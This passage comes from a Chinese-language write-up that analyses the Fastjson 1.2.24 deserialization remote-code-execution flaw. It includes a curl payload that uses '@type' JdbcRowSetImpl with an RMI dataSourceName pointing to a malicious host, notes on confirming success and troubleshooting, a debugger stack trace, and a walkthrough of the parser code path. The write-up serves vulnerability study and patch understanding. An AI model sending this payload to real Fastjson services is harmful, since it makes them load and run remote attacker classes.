    # Curl
    curl :/user -H "Content-Type:application/json" -d '{"b":{"@type":"com.sn.rowset.JdbcRowSetImpl","dataSourceName":"rmi://:/TouchFile","autoCommit":true}}'
发送请求  
如果成功将有如下表现
  1. 文件服务器将出现如下记录。这是来自目标服务器的访问（RMI将你的数据信息告诉了目标服务器）  
如果此处未出现任何记录，请检查目标主机与恶意主机是否可以互相ping通，其次请检查，RMI服务是否注册绑定文件服务器（注意在绑定时，填写的恶意主机IP不能是本地回环地址，这是要发送到目标主机的数据）
  2. 如果RMI服务出现如下记录。这是来自目标服务器的访问，他将告诉目标主机去哪里获取它想要的文件数据。  
如果此处未出现任何记录，请检查目标主机与恶意主机之间是否可以互相访问（ping）。其次检查请求包`dataSourceName`字段是否填写正确。
  3. 目标docker容器执了命令，这里是在`tmp`目录下创建了`success`文件  
## 漏洞分析
###  IDEA构建调试环境
为了方便分析调试和追踪恶意数据，便不使用`vulhub`集成环境了。  
代码链接：[Link](https://gitee.com/Plastilina/fast-json-demo.git)  
JDK版本：[8u102](https://download.oracle.com/otn/java/jdk/8u102-b14/jdk-8u102-linux-x64.tar.gz?AuthParam=1619161090_9918e544f4ca929b58d65fba32af65c9
"8u102")，默认开启`com.sun.jndi.rmi.object.trustURLCodebase`
**调试执行**
  1. 调试启动服务端  
使用`IDEA`调试启动服务端，指定监听端口可在`src/main/resources/application.properties`目录下修改。
  2. 构建payload触发漏洞  
使用`curl`发送`payload`  
`curl :/user -H "Content-Type:application/json" -d
'{"b":{"[@type](https://github.com/type
"@type")":"com.sn.rowset.JdbcRowSetImpl","dataSourceName":"rmi://:/TouchFile","autoCommit":true}}'`
###  漏洞分析
**观察异常堆栈**
当恶意代码执行完毕后，由于后续的状态的校验没有通过，会触发异常，返回调用堆栈。(请启用断点中的异常断点)
截取主要部分  
整个堆栈大致可以分为两部分
  1. 1-7行，为`JdbcRowSetImpl`中反射调用利用链流程。
  2. 8-末，为`FastJson`中的反序列化处理流程。
    java.sql.SQLException: JdbcRowSet (连接) JNDI 无法连接
            at com.sun.rowset.JdbcRowSetImpl.connect(Unknown Source) ~[na:1.8.0_102]
            at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(Unknown Source) ~[na:1.8.0_102]
            at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_102]
            at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
            at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[na:1.8.0_102]
            at java.lang.reflect.Method.invoke(Unknown Source) ~[na:1.8.0_102]
            at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:96) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:593) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_2_JdbcRowSetImpl.deserialze(Unknown Source) ~[na:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseExtra(DefaultJSONParser.java:1490) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:766) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:922) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User.deserialze(Unknown Source) ~[na:na]
            at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:339) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:307) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:270) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:370) ~[fastjson-1.2.24.jar!/:na]
            at com.alibaba.fastjson.JSON.parseObject(JSON.java:452) ~[fastjson-1.2.24.jar!/:na]
**流程跟踪**
#### 针对`JdbcRowSetImpl`中反射调用利用链流程跟踪。
在`Method.invoke`处设置断点，发送`Payload`触发断点。  
可以看见`setAutoCommit`方法被调用了，这也就是`Payload`中设置`AutoCommit:false`的原因（其实`true/false`无所谓，只是为了触发反射调用。）
随后进入`setAutoCommit`源码，发现调用了`connect`,继续跟进。
跟进后发现了JNDI初始化流程，而这里的`getDataSourceName`,返回的便是我们`Payload`中`DataSouceName`。  
`lookup`中的参数可控，就和`exec`参数可控一样，具有很高的危险性。  
至此，通过`RMI`协议加载并实例化远程类，触发构造方法、静态方法等等，达到了攻击的目的。
#### 针对`FastJson`中的反序列化处理流程跟踪。
**JSON.parseObject**  
`JSON.parseObject`主要做了这么几件事
  * 将输入的byte字节数组转为String  
  * 创建并初始化`DefaultJSONParer`解析器  
  * 使用解析器解析输入流  
**DefaultJSONParser.parseObject**  
`JSON.parseObject`主要做了这么几件事
  * 创建`User`类的序列化器  
  * 使用序列化器反序列化  
**JavaBeanDeserializer.deserialze**  
这里的`JavaBeanDeserializer.deserialze`对应着上面的序列化器  
采用了`JAVA`的`ASM`技术动态的生成了类，并使用其创建了序列化器。  
其主要做了一下几件事
  * 遍历`JSON`字符串,查看是否有对应的字段，有则填充  
  * 当并未在字符串中扫描到对应的字段时，流程会走向`JavaBeanDeserializer.parseField`  
**JavaBeanDeserializer.parseField**  
`JavaBeanDeserializer.parseField`内会做如下几件事
  * 调用`smartMatch`,尝试从已有的`FieldDeserializers`中匹配字段反序列化器  
  * 当没有匹配到对应的反序列化器时，流程走向`DefaultJSONParser.parseExtra`  
而`parseExtra`内会匹配`extraTypeProviders`，匹配失败的话流程走向`DefaultJSONParser.parse`  
**DefaultJSONParser.parse**  
`DefaultJSONParser.parse`内会做如下几件事
  * 根据`lexer`选择执行流程，`lexer`在最开始初始化`DefaultJSONParer`内完成。  
这里的`LBRACE`对应着字符`{`。然后调用`DefaultJSONParer.parseObject`一个重载再次解析。  
 **DefaultJSONParer.parseObject**  
重点来了，流程如下
  1. 解析`JSON`格式的`payload`,扫描到`[@type](https://github.com/type "@type")`字段后，使用类加载器加载对应的类`JdbcRowSetImpl`  
  2. 获取`JdbcRowSetImpl`的序列化器进行反序列化  
  3. 在反序列化时，通过反射调用触发漏洞。  
## 漏洞总结
关于反序列系列的漏洞，我们通常关注的两个点：
  * 反序列化链
  * 反序列化链的利用
如前边所展现的`com.sn.rowset.JdbcRowSetImpl`便是一条反序列化链，通过设置`dataSourceName`与`autoCommit`属性，达到加载恶意类文件目的。  
类似的利用链还有`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
而接下来的`FastJson`一系列的调用，便是对反序列化的链的一个利用。  
可以发现，在首次反序列化失败后，流程会扫描传入的`JSON`字符串，并根据`[@type](https://github.com/type
"@type")`字段的值进行指定类型的构造，这也是此次漏洞主要的点。
在`FastJson`更高版本上便是增加了对`[@type](https://github.com/type "@type")`类型进行了一系列的检查过滤。
### 参考
[fastjson历史漏洞研究（一）](http://blog.topsec.com.cn/fastjson%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%EF%BC%88%E4%B8%80%EF%BC%89/)  
[基于Java反序列化RCE – 搞懂RMI、JRMP、JNDI](https://xz.aliyun.com/t/7079)  
[Fastjson 流程分析及 RCE 分析](https://paper.seebug.org/994/)